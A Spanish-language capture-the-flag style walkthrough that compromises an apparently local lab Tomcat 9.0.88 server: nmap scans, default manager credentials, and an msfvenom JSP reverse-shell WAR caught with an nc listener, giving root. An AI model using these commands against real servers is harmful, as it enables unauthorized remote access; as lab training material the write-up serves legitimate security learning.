![1](Images/1.png)

Comenzamos escaneando con nmap los puertos abiertos de la máquina objetivo.

``sudo nmap 172.17.0.2 -sS -p- --open --min-rate 5000 -n -Pn``

![2](Images/2.png)

Vale, tenemos el p8080 abierto. Vamos a realizar otro escaneo sobre este puerto para ver qué servicio y versión está corriendo.

``nmap 172.17.0.2 -sCV -p8080``

![3](Images/3.png)

Vemos que existe un Tomcat 9.0.88. Vamos a echarle un vistazo a nivel de navegador.

![4](Images/4.png)

Tenemos la página default de tomcat. Si husmeamos un poco, no vemos nada interesante.

Vamos a intentar loguearnos con credenciales básicas/default en la ruta predeterminada del panel de login de tomcat: ``/manager/html``.

Gracias a este recurso de hacktricks podemos ver diferentes combinaciones de credenciales default.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html?highlight=tomcat%20creds#default-credentials

![5](Images/5.png)



Accedemos a ``/manager/html`` y se prueban las diferentes combinaciones propuestas.

![6](Images/6.png)

La combinación ``tomcat``:``s3cr3t`` funciona.

![7](Images/7.png)

Estamos dentro del panel de administración. Si scrolleamos un poco, vemos que podemos subir un fichero con extensión ``.war``:

![8](Images/8.png)


Vamos a preparar una revshell con ``msfvenom``:

``msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=8080 -f war -o rev.war``

![9](Images/9.png)


Una vez la tenemos, la subimos:

![10](Images/10.png)


Nos aparece en el apartado Applications:

![11](Images/11.png)


Levantamos listener en el puerto previamente especificado en el comando de ``msfvenom`` (8080).

``nc -nvlp 8080``

Accedemos a nuestra revshell a través de navegador y acto seguido revisamos nuestro listener:

![12](Images/12.png)

Somos root en máquina víctima.
